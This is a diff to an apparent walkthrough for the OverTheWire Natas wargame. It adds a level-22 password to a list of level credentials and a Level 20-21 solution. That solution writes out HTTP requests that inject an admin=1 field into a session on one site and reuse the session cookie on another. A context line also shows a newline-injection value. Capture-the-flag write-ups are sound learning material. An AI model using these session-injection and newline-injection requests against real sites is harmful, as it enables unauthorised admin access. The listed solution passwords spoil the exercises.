@@ -25,6 +25,7 @@ The username is `natas` + the level.
 - 19: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
 - 20: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
 - 21: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
+- 22: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
 
 ## Level 9-10
 
@@ -384,3 +385,34 @@ name=test%0aadmin 1
 ```
 
 This request will return the response with the password for the next level.
+
+## Level 20-21
+
+First make a post request like the following:
+
+```txt
+POST /index.php?debug= HTTP/1.1
+Host: natas21-experimenter.natas.labs.overthewire.org
+```
+
+That contains the body:
+
+```txt
+align=center&fontsize=100%25&bgcolor=yellow&submit=Update&admin=1
+```
+
+Retrieve the Cookie `PHPSESSID=3h20kvdmafnlfm66cappne72cm` and use it in the request for the other site:
+
+```txt
+GET / HTTP/1.1
+Host: natas21.natas.labs.overthewire.org
+Cache-Control: max-age=0
+Authorization: Basic bmF0YXMyMTpCUGh2NjNjS0UxbGtRbDA0Y0U1Q3VGVHpYZTE1TmZpSA==
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=3h20kvdmafnlfm66cappne72cm
+Connection: keep-alive
+```
